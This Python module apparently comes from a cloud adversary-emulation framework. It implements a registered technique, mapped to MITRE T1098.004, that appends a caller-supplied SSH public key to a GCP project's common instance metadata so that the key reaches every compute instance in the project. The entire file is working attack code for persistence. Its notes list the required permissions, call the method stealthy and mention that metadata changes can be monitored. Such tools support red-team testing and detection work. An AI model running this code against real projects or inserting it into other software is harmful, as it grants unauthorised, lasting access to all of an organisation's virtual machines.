"""GCP Persistence via SSH Key Addition technique implementation.

This module implements a technique for maintaining persistence in GCP by adding SSH keys
to project metadata. It allows for automatic propagation of SSH keys to all instances
in a project, providing persistent access to compute instances.
"""

from ..base_technique import (
    BaseTechnique,
    ExecutionStatus,
    MitreTechnique,
    TechniqueNote,
    TechniqueReference
)
from ..technique_registry import TechniqueRegistry

from typing import Dict, Any, Tuple
import json
import base64
from googleapiclient.errors import HttpError
from google.auth.exceptions import GoogleAuthError, RefreshError
from google.oauth2 import service_account
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from core.gcp.gcp_access import GCPAccess


class GCPSSHKeyError(Exception):
    """Base exception for GCP SSH key operations."""
    pass


class CredentialError(GCPSSHKeyError):
    """Raised when there are issues with credentials."""
    pass


class ProjectMetadataError(GCPSSHKeyError):
    """Raised when there are issues with project metadata operations."""
    pass


class ParameterValidationError(GCPSSHKeyError):
    """Raised when there are issues with parameter validation."""
    pass


@TechniqueRegistry.register
class GCPPersistenceViaSSHKeyAddition(BaseTechnique):
    """Implements persistence in GCP by adding SSH keys to project metadata.

    This technique adds SSH keys to GCP project metadata, which automatically
    propagates to all instances in the project. This provides persistent access
    to all compute instances, including newly created ones.
    """

    def __init__(self):
        """Initialize the GCP Persistence via SSH Key Addition technique."""
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.004",
                technique_name="Account Manipulation",
                tactics=["Persistence"],
                sub_technique_name="SSH Authorized Keys"
            )
        ]
        
        technique_notes = [
            TechniqueNote(
                "This technique requires either specific GCP roles OR granular "
                "permissions to execute successfully. The roles provide broader "
                "access while the granular permissions offer more precise control."
            ),
            TechniqueNote(
                "Required roles: compute.admin (full control over compute resources), "
                "compute.instanceAdmin (manage compute instances), "
                "iam.serviceAccountUser (act as service accounts)."
            ),
            TechniqueNote(
                "Required granular permissions: "
                "compute.projects.setCommonInstanceMetadata (modify project metadata), "
                "iam.serviceAccounts.actAs (impersonate service accounts), "
                "compute.projects.get (read project information)."
            ),
            TechniqueNote(
                "This technique adds an SSH key to the GCP project metadata, which "
                "automatically propagates to all instances in the project. This "
                "provides persistent access to all compute instances, even newly "
                "created ones, without requiring individual instance configuration."
            ),
            TechniqueNote(
                "This is a stealthy persistence mechanism as it operates at the "
                "project level rather than individual instances. Changes to project "
                "metadata should be monitored, particularly modifications to SSH keys."
            )
        ]
        
        technique_refs = [
            TechniqueReference(
                "GCP SSH Key Management",
                "https://cloud.google.com/compute/docs/connect/add-ssh-keys"
            ),
            TechniqueReference(
                "GCP Metadata Management",
                "https://cloud.google.com/compute/docs/metadata/setting-custom-metadata"
            ),
            TechniqueReference(
                "GCP IAM Roles",
                "https://cloud.google.com/iam/docs/understanding-roles"
            ),
            TechniqueReference(
                "Generate SSH Keys",
                "https://cloud.google.com/compute/docs/connect/create-ssh-keys"
            )
        ]
        
        super().__init__(
            name="Add SSH Key to GCP Project Metadata",
            description="Adds an SSH key to GCP project metadata to maintain persistence",
            mitre_techniques=mitre_techniques,
            notes=technique_notes,
            references=technique_refs
        )

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        """Execute the SSH key addition technique.

        Args:
            **kwargs: Keyword arguments containing:
                - project_id (str, optional): GCP project ID
                - ssh_public_key (str): SSH public key to add
                - username (str): Username for the SSH key

        Returns:
            Tuple[ExecutionStatus, Dict[str, Any]]: Execution status and result details
        """
        try:
            if not self._validate_parameters(kwargs):
                return ExecutionStatus.FAILURE, {
                    "error": "Parameter validation failed",
                    "message": "Required parameters are missing or invalid"
                }

            project_id: str = kwargs.get("project_id", None)
            ssh_public_key: str = kwargs['ssh_public_key']
            username: str = kwargs['username']

            # try:
            manager = GCPAccess()
            manager.get_current_access()
            credential = manager.credential

            try:
                compute_service = build('compute', 'v1', credentials=credential)
            except Exception as e:
                raise CredentialError(f"Failed to build compute service: {str(e)}")

            if project_id is None:
                project_id = credential.project_id

            try:
                request = compute_service.projects().get(project=project_id)
                response = request.execute()
            except HttpError as e:
                if e.resp.status == 403:
                    raise ProjectMetadataError(
                        f"Permission denied: Insufficient permissions to access "
                        f"project {project_id}"
                    )
                elif e.resp.status == 404:
                    raise ProjectMetadataError(f"Project {project_id} not found")
                else:
                    raise ProjectMetadataError(
                        f"Failed to get project metadata: {str(e)}"
                    )

            if not self._validate_ssh_key_format(ssh_public_key):
                raise ParameterValidationError("Invalid SSH public key format")

            new_ssh_key = f"{username}:{ssh_public_key}"

            if 'commonInstanceMetadata' not in response:
                response['commonInstanceMetadata'] = {'items': []}
            elif 'items' not in response['commonInstanceMetadata']:
                response['commonInstanceMetadata']['items'] = []

            ssh_keys_item = None
            for item in response['commonInstanceMetadata'].get('items', []):
                if item.get('key') == 'ssh-keys':
                    ssh_keys_item = item
                    break

            if ssh_keys_item:
                if new_ssh_key in ssh_keys_item['value']:
                    return ExecutionStatus.SUCCESS, {
                        "message": (
                            f"SSH key for user {username} already exists in "
                            f"project {project_id}"
                        ),
                        "value": {
                            "project": project_id,
                            "username": username,
                            "ssh_key_added": False,
                            "reason": "Key already exists"
                        }
                    }
                ssh_keys_item['value'] = f"{ssh_keys_item['value']}\n{new_ssh_key}"
            else:
                response['commonInstanceMetadata']['items'].append({
                    'key': 'ssh-keys',
                    'value': new_ssh_key
                })

            try:
                update_request = compute_service.projects().setCommonInstanceMetadata(
                    project=project_id,
                    body=response['commonInstanceMetadata']
                )
                update_response = update_request.execute()
            except HttpError as e:
                if e.resp.status == 403:
                    raise ProjectMetadataError(
                        "Permission denied: Insufficient permissions to update "
                        "project metadata"
                    )
                else:
                    raise ProjectMetadataError(
                        f"Failed to update project metadata: {str(e)}"
                    )

            return ExecutionStatus.SUCCESS, {
                "message": (
                    f"Successfully added SSH key for user {username} to "
                    f"project {project_id}"
                ),
                "value": {
                    "project": project_id,
                    "username": username,
                    "ssh_key_added": True,
                    "operation_id": update_response.get('id')
                }
            }

        except CredentialError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Credential Error",
                "message": str(e)
            }
        except ProjectMetadataError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Project Metadata Error",
                "message": str(e)
            }
        except ParameterValidationError as e:
            return ExecutionStatus.FAILURE, {
                "error": "Parameter Validation Error",
                "message": str(e)
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": "Unexpected Error",
                "message": f"An unexpected error occurred: {str(e)}"
            }

    def _validate_parameters(self, kwargs: Dict[str, Any]) -> bool:
        """Validate required parameters.

        Args:
            kwargs: Dictionary of parameters to validate

        Returns:
            bool: True if all required parameters are present, False otherwise
        """
        required_params = ['ssh_public_key', 'username']
        return all(kwargs.get(param) for param in required_params)

    def _validate_ssh_key_format(self, ssh_key: str) -> bool:
        """Validate SSH key format.

        Args:
            ssh_key: SSH public key to validate

        Returns:
            bool: True if the key format is valid, False otherwise
        """
        return ssh_key.startswith((
            'ssh-rsa',
            'ssh-dss',
            'ssh-ed25519',
            'ecdsa-sha2-nistp'
        ))

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        """Get the parameters required for this technique.

        Returns:
            Dict[str, Dict[str, Any]]: Dictionary of parameter definitions
        """
        return {
            "project_id": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Project ID",
                "input_field_type": "text"
            },
            "ssh_public_key": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "SSH Public Key",
                "input_field_type": "text"
            },
            "username": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Username",
                "input_field_type": "text"
            }
        } 